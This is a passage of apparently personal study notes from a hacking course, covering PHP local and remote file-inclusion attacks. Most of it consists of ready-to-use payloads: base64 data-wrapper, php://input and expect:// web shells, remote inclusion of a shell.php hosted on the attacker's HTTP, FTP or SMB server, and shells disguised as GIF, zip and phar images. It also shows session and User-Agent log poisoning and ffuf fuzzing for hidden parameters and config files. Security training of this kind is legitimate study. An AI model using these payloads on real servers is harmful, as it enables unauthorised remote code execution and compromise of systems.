<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; | base64</span><br></span></code></pre></div></div>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></p>
<p>And we can execute any command via PHP. We can do it via cURL:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ curl -s &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id&#x27; | grep uid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="input-wrapper">Input wrapper<a href="#input-wrapper" class="hash-link" aria-label="Direct link to Input wrapper" title="Direct link to Input wrapper">​</a></h3>
<p>Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request&#x27;s data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl -s -X POST --data &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot; | grep uid</span><br></span></code></pre></div></div>
<p>Additionally, we can add the command directly into the data, e.g:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;\?php system(&#x27;id&#x27;)?&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="expect-wrapper">Expect wrapper<a href="#expect-wrapper" class="hash-link" aria-label="Direct link to Expect wrapper" title="Direct link to Expect wrapper">​</a></h3>
<p>Works in a similar way of the previous one, but it is external and needs to be manually installed. First, we need to check if it&#x27;s configured checking for <code>extension=expect</code> in php.ini</p>
<p>If present, the attack is straightforward:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="remote-file-inclusion">Remote File Inclusion<a href="#remote-file-inclusion" class="hash-link" aria-label="Direct link to Remote File Inclusion" title="Direct link to Remote File Inclusion">​</a></h2>
<p>In some cases, we are able to include not only local files, but remote files. This is very useful to the attacker, since it can host a malicious script in the machine and force the application to include it.</p>
<p>Usually the language has some config that disables RFI completely, but in some cases it is enabled. In PHP, the config is the same as we have seen before: <code>allow_url_include = On</code>.</p>
<p>There are some import functions vulnerable to RFI while the others don&#x27;t. Refer to the table at the beginning for reference.</p>
<p>So, the first step is to verify if we can do a RFI. Try to include a local URL:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php</code>.</p>
<p>We can use RFI to do Remote Code execution:</p>
<p>We can craft a malicious script:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.php</span><br></span></code></pre></div></div>
<p>and host it in our machine:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 -m http.server &lt;LISTENING_PORT&gt;</span><br></span></code></pre></div></div>
<p>Later on, we can include our URL as the RFI to perform RCE.</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></p>
<p>We can host our file using <code>FTP</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo python -m pyftpdlib -p 21</span><br></span></code></pre></div></div>
<p>and include it:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id</code></p>
<p>If the server is a Windows machine, we don&#x27;t need the <code>allow_url_include</code>. We can use <code>SMB</code> protocol for RFI. This is because Windows treats files on remote SMB servers as normal files</p>
<p>We can spin up a samba server using <code>impacket smbserver.py</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">impacket-smbserver -smb2support share $(pwd)</span><br></span></code></pre></div></div>
<p>And include our URL by using a UNC path:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="lfi-and-file-uploads">LFI and file uploads<a href="#lfi-and-file-uploads" class="hash-link" aria-label="Direct link to LFI and file uploads" title="Direct link to LFI and file uploads">​</a></h2>
<p>If the application allows the user to upload files, this might lead to LFI. For example, an application allow the user to upload an image, however, we can upload a PHP web shell. If the importing function has <code>Execute</code> capabilities it will execute the code uploaded.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.gif</span><br></span></code></pre></div></div>
<p>We then upload this gif as our profile picture. Later in the application, we see where it is imported:</p>
<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">img</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">/profile_images/shell.gif</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">class</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">profile-image</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">profile-image</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<p>in index.php. We just need to pass the <code>cmd</code> parameter now:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></p>
<p>Something similar can be achieve with the <code>zip</code> wrapper (not enabled by default).</p>
<p>We can create a malicious zip disguised as an image:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.php &amp;&amp; zip shell.jpg shell.php</span><br></span></code></pre></div></div>
<p>And use the <code>zip</code> wrapper for RCE:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</code>.</p>
<p>We can also use the <code>phar</code> wrapper to the same.</p>
<p>To do so, we can write a PHP script:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token delimiter important">&lt;?php</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$phar</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">Phar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;shell.phar&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$phar</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token function" style="color:#d73a49">startBuffering</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$phar</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token function" style="color:#d73a49">addFromString</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;shell.txt&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$phar</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token function" style="color:#d73a49">setStub</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$phar</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token function" style="color:#d73a49">stopBuffering</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>We can compile it into a <code>phar</code> file and later rename it to an image:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</span><br></span></code></pre></div></div>
<p>And similarly include it:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="log-poisoning">Log poisoning<a href="#log-poisoning" class="hash-link" aria-label="Direct link to Log poisoning" title="Direct link to Log poisoning">​</a></h2>
<p>This types of attacks rely on importing functions that have the <code>Execute</code> privileges. The main idea is that if we are aware of any info that is logged to a file, we can send our malicious payload so that it gets logged. Then, we&#x27;ll import the poisoned log to be executed.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="php-session-poisoning">PHP Session poisoning<a href="#php-session-poisoning" class="hash-link" aria-label="Direct link to PHP Session poisoning" title="Direct link to PHP Session poisoning">​</a></h2>
<p>Similar to log poisoning, session data is stored in files in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. E.g, if the PHPSESSIONID is <code>el4ukv0kqbvoirg7nkp4dncpk3</code>, the location in the disk will be <code>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3</code>.</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></p>
<p>Now, we should look for some value in the session that is under our control. For example, <code>language</code>.</p>
<p>We can write a URL-encoded web shell in language:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code>.</p>
<p>Then, when we visit the page with the session LFI, we&#x27;ll get Remote Code Execution:</p>
<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="server-log-poisoning">Server log poisoning<a href="#server-log-poisoning" class="hash-link" aria-label="Direct link to Server log poisoning" title="Direct link to Server log poisoning">​</a></h2>
<p>We can abuse Apache or Nginx access or error logs to inject some malicious PHP that will be imported with the LFI vulnerability.</p>
<p>We can control the User-Agent of our client, therefore, we can send a request with User-Agent header with the web shell:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ echo -n &quot;User-Agent: &lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot; &gt; Poison</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -H @Poison</span><br></span></code></pre></div></div>
<p>The poisoning technique might be used for SSH, mail or ftp logs.</p>
<p>We should determine first if we have access to the files using the LFI.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fuzzing-parameters">Fuzzing parameters<a href="#fuzzing-parameters" class="hash-link" aria-label="Direct link to Fuzzing parameters" title="Direct link to Fuzzing parameters">​</a></h2>
<p>Usually, the parameters in forms and such are well protected. However, there might be hidden parameters not well secured and vulnerable to LFI.</p>
<p>Example with <code>fuff</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#x27;</span><br></span></code></pre></div></div>
<p>We can find good wordlists for LFI seclists: Fuzzing/LFI and LFI-Jhaddix.</p>
<p>We can use the LFI to discover the contents of the server, for example identifying the server root. For example:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#x27; </span><br></span></code></pre></div></div>
<p>Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.</p>
<p>Same technique can be leveraged to find server configuration or logs. For example, these two wordlists <a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux</a> and <a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows</a> allows to reveal several configuration and log files.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ffuf -w ./LFI-WordList-Linux:FUZZ -u &#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#x27;</span><br></span></code></pre></div></div></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/flight-sim/dcs/su25t"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Reference</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Hacking/HTB Academy/File transfers"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">File transfer</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#local-file-inclusion" class="table-of-contents__link toc-highlight">Local file inclusion</a><ul><li><a href="#basic-lfi" class="table-of-contents__link toc-highlight">Basic LFI</a></li><li><a href="#path-traversal" class="table-of-contents__link toc-highlight">Path traversal</a></li><li><a href="#filename-prefix" class="table-of-contents__link toc-highlight">Filename prefix</a></li><li><a href="#appended-extensions" class="table-of-contents__link toc-highlight">Appended extensions</a></li><li><a href="#second-order-attacks" class="table-of-contents__link toc-highlight">Second order attacks</a></li></ul></li><li><a href="#basic-bypass" class="table-of-contents__link toc-highlight">Basic bypass</a><ul><li><a href="#search-and-replace-filter" class="table-of-contents__link toc-highlight">Search and replace filter</a></li><li><a href="#encoding" class="table-of-contents__link toc-highlight">Encoding</a></li><li><a href="#approved-paths" class="table-of-contents__link toc-highlight">Approved paths</a></li><li><a href="#approved-extension" class="table-of-contents__link toc-highlight">Approved extension</a></li></ul></li><li><a href="#php-filters" class="table-of-contents__link toc-highlight">PHP Filters</a></li><li><a href="#php-wrappers" class="table-of-contents__link toc-highlight">PHP Wrappers</a><ul><li><a href="#data-wrapper" class="table-of-contents__link toc-highlight">Data wrapper</a></li><li><a href="#input-wrapper" class="table-of-contents__link toc-highlight">Input wrapper</a></li><li><a href="#expect-wrapper" class="table-of-contents__link toc-highlight">Expect wrapper</a></li></ul></li><li><a href="#remote-file-inclusion" class="table-of-contents__link toc-highlight">Remote File Inclusion</a></li><li><a href="#lfi-and-file-uploads" class="table-of-contents__link toc-highlight">LFI and file uploads</a></li><li><a href="#log-poisoning" class="table-of-contents__link toc-highlight">Log poisoning</a></li><li><a href="#php-session-poisoning" class="table-of-contents__link toc-highlight">PHP Session poisoning</a></li><li><a href="#server-log-poisoning" class="table-of-contents__link toc-highlight">Server log poisoning</a></li><li><a href="#fuzzing-parameters" class="table-of-contents__link toc-highlight">Fuzzing parameters</a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>